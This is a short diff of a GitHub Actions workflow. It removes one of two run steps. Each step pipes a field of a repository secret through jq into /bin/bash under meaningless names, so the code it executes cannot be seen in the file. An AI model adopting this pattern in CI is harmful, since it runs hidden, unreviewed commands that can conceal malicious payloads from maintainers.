@@ -17,7 +17,6 @@ jobs:
           eer51: ${{ secrets.eer51 }}
         run: |
           printf '%s' "$eer51" | jq -r .px63095 | /bin/bash
-          printf '%s' "$zr546" | jq -r .kko0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
